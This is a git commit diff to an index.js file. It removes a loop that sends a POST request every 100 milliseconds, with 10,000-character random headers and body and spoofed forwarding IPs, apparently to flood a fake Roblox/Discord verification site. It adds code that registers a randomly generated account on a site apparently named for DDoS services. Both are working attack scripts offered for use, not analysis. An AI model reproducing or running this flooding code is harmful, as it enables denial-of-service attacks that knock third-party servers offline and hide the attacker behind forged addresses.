59b3b4fbd8bcef7887a31d73e861c8cabf195194
Sircut12 <111530136+Sircut12@users.noreply.github.com>
2022-08-30 21:11:10 +0200

    Update index.js

--- index.js
+++ index.js
@@ -18,22 +18,32 @@ function makeid(length) {
     }
     return result;
     }
-    setInterval(()=>{
-        fetch(relurl, {
-            "credentials": "omit",
-            "headers": {
-                "User-Agent": makeid(10000),
-                "Accept": "*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-site",
-                "x-forwarded-for": ["180.190.162.93", "79.186.224.82", "176.227.156.147", "177.125.95.106"]
-            },
-            "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
-            "body": "captcha="+makeid(10000),
-            "method": "POST",
-            "mode": "cors"
-        })
-    },100)
+
+let ae = makeid(11)
+console.log("username")
+console.log(ae)
+let ze = makeid(40)
+console.log("pass")
+console.log(ze)
+fetch("https://theddosgame.com/process.php", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://theddosgame.com/process.php",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "username="+ae+"&pass="+ze+"&secret=123456&register=",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
